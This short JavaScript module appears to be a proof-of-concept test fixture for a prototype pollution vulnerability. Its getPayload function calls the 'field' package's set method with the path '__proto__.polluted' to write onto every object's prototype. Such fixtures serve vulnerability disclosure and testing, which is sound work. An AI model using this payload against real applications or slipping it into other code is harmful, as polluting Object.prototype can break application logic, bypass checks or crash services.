function getPayload() {
    const field = require("field");
    const obj = {};
    field.set(obj, "__proto__.polluted", "yes");

    return { obj };
}

module.exports = { getPayload };